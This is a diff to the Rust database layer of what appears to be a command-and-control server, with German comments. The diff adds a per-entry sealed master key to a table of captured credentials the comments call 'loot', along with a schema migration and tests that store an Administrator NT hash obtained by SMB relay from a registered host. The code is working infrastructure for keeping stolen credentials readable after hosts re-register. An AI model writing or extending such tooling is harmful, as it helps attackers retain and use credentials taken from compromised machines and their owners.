@@ -53,6 +53,11 @@ struct SecretRow {
     /// haelt jede Zuweisung an ein Feld mit "password" im Namen fuer ein
     /// eingebettetes Zugangsdaten.
     pub versiegelt: String,
+    /// Der versiegelte Master-Key, mit dem dieses Stueck versiegelt wurde.
+    ///
+    /// Reist mit der Beute: so ist jede Zeile fuer sich lesbar, auch wenn
+    /// der Host-Eintrag inzwischen einen anderen Schluessel fuehrt.
+    pub versiegelter_master: String,
 }
 
 /// Zeile der `tasks`-Tabelle.
@@ -98,7 +103,7 @@ impl Db {
             CREATE TABLE IF NOT EXISTS secrets (
                 id TEXT PRIMARY KEY, host_id TEXT, cred_type TEXT,
                 username TEXT, password TEXT, source TEXT, collected_at TEXT,
-                sealed_password TEXT
+                sealed_password TEXT, sealed_master TEXT
             );
             CREATE TABLE IF NOT EXISTS tasks (
                 id TEXT PRIMARY KEY, host_id TEXT, command TEXT,
@@ -111,7 +116,11 @@ impl Db {
         // also nie — und jeder INSERT schlaege fehl. Deshalb werden die
         // Spalten hier nachgezogen.
         Self::ergaenze_spalten(&conn, "hosts", &[("sealed_master", "TEXT")])?;
-        Self::ergaenze_spalten(&conn, "secrets", &[("sealed_password", "TEXT")])?;
+        Self::ergaenze_spalten(
+            &conn,
+            "secrets",
+            &[("sealed_password", "TEXT"), ("sealed_master", "TEXT")],
+        )?;
 
         // Die Tabelle `secrets` bekommt erst hier ihre fachliche Identitaet:
         // ohne den UNIQUE-Index kann der Upsert keinen Konflikt erkennen.
@@ -324,6 +333,10 @@ impl Db {
             source: upload.source.clone().unwrap_or_default(),
             collected_at: now_rfc3339(),
             versiegelt: sealed_password,
+            // Der Schluessel reist mit der Beute. Ohne ihn waere die Zeile an
+            // den Schluessel des Host-Eintrags gebunden — und der Server
+            // ersetzt diesen bei jeder Registrierung.
+            versiegelter_master: upload.sealed_master.clone().unwrap_or_default(),
         };
         self.upsert_secret_row(&row)
     }
@@ -338,12 +351,13 @@ impl Db {
 
     fn upsert_secret_row(&self, s: &SecretRow) -> Result<(), DbError> {
         self.conn.lock().unwrap().execute(
-            "INSERT INTO secrets (id, host_id, cred_type, username, password, source, collected_at, sealed_password)
-             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)
+            "INSERT INTO secrets (id, host_id, cred_type, username, password, source, collected_at, sealed_password, sealed_master)
+             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9)
              ON CONFLICT(host_id, cred_type, username, source) DO UPDATE SET
                collected_at = excluded.collected_at,
                password = excluded.password,
-               sealed_password = excluded.sealed_password",
+               sealed_password = excluded.sealed_password,
+               sealed_master = excluded.sealed_master",
             params![
                 s.id,
                 s.host_id,
@@ -352,7 +366,8 @@ impl Db {
                 s.password,
                 s.source,
                 s.collected_at,
-                s.versiegelt
+                s.versiegelt,
+                s.versiegelter_master,
             ],
         )?;
         Ok(())
@@ -370,7 +385,7 @@ impl Db {
     fn list_secret_rows(&self) -> Result<Vec<SecretRow>, DbError> {
         let conn = self.conn.lock().unwrap();
         let mut stmt = conn.prepare(
-            "SELECT id, host_id, cred_type, username, password, source, collected_at, sealed_password FROM secrets",
+            "SELECT id, host_id, cred_type, username, password, source, collected_at, sealed_password, sealed_master FROM secrets",
         )?;
         let rows = stmt.query_map([], |r| {
             Ok(SecretRow {
@@ -385,6 +400,9 @@ impl Db {
                 // Zeilen, die schon davor da waren, tragen dort NULL. Der
                 // Leser muss das aushalten, sonst faellt die Liste aus.
                 versiegelt: r.get::<_, Option<String>>(7)?.unwrap_or_default(),
+                // Wie `sealed_password` per `ALTER TABLE` nachgezogen: die
+                // Zeilen, die schon davor da waren, tragen dort NULL.
+                versiegelter_master: r.get::<_, Option<String>>(8)?.unwrap_or_default(),
             })
         })?;
         rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
@@ -504,6 +522,7 @@ impl SecretRow {
             source: self.source.clone(),
             collected_at: self.collected_at.clone(),
             sealed_password: String::new(),
+            sealed_master: self.versiegelter_master.clone(),
         }
         .mit_versiegeltem_passwort(self.versiegelt.clone())
     }
@@ -633,6 +652,40 @@ mod tests {
     ///
     /// Die Beute gehoert zu einem bekannten Host — ohne diese Zeile lehnt
     /// `upsert_secret` jeden Upload ab.
+    /// Die Beute trägt ihren Schlüssel mit — der Server gibt ihn mit der Zeile
+    /// zurück.
+    ///
+    /// Ohne das wäre die Zeile an den Schlüssel des Host-Eintrags gebunden, und
+    /// der Server ersetzt ihn bei jeder Registrierung: Die Zeile wäre
+    /// unlesbar, ohne dass irgendwo ein Fehler stünde.
+    #[test]
+    fn die_ausgabe_traegt_den_schluessel_der_beute_mit() {
+        let dir = std::env::temp_dir();
+        let pfad = dir.join(format!("kx-beute-schluessel-{}.db", uuid::Uuid::new_v4()));
+        let db = Db::open(&pfad).expect("Datenbank");
+        registriere(&db, "10.0.0.5");
+
+        let upload = c2::SecretUpload {
+            host_id: "10.0.0.5".into(),
+            cred_type: "nt_hash".into(),
+            username: "Administrator".into(),
+            password: String::new(),
+            source: Some("smb_relay".into()),
+            master_key: None,
+            sealed_password: Some("kx1:siegel".into()),
+            sealed_master: Some("platzhalter-master".into()),
+        };
+        db.upsert_secret(&upload).expect("Upload");
+
+        let zeilen = db.list_secret_rows().expect("Zeilen");
+        assert_eq!(zeilen.len(), 1, "die Zeile fehlt");
+        assert_eq!(
+            zeilen[0].versiegelter_master, "platzhalter-master",
+            "der Schluessel der Beute ging beim Auslesen verloren"
+        );
+        std::fs::remove_file(&pfad).ok();
+    }
+
     fn registriere(db: &Db, host_id: &str) {
         db.upsert_host(&c2::RegisterRequest {
             host_id: host_id.into(),
@@ -702,6 +755,7 @@ mod tests {
             source: Some("smb_relay".into()),
             master_key: None,
             sealed_password: None,
+            sealed_master: None,
         }
         .mit_versiegeltem_passwort(Some("kx1:siegel".into()));
 
@@ -748,6 +802,7 @@ mod tests {
             source: Some("smb_relay".into()),
             master_key: None,
             sealed_password: None,
+            sealed_master: None,
         }
         .mit_passwort("hash");
 
@@ -855,6 +910,7 @@ mod tests {
             source: "smb_relay".into(),
             collected_at: "2026-11-11T00:05:00Z".into(),
             versiegelt: String::new(),
+            versiegelter_master: String::new(),
         };
         let wire = row.to_contract();
         assert_eq!(wire.host_id, "10.0.0.5");
@@ -880,6 +936,7 @@ mod tests {
             source: Some("smb_relay".into()),
             master_key: None,
             sealed_password: None,
+            sealed_master: None,
         }
         .mit_versiegeltem_passwort(Some("kx1:ersterlauf".into()));
         db.upsert_secret(&upload).expect("erster Upload");
@@ -924,6 +981,7 @@ mod tests {
             source: "smb_relay".into(),
             collected_at: "2026-11-11T00:00:00Z".into(),
             versiegelt: "kx1:ersterlauf".into(),
+            versiegelter_master: String::new(),
         };
         db.upsert_secret_row(&row).expect("erster Upload");
 
@@ -960,6 +1018,7 @@ mod tests {
             source: Some("smb_relay".into()),
             master_key: None,
             sealed_password: None,
+            sealed_master: None,
         }
         .mit_versiegeltem_passwort(Some("kx1:siegel".into()));
         db.upsert_secret(&upload).expect("erster Upload");
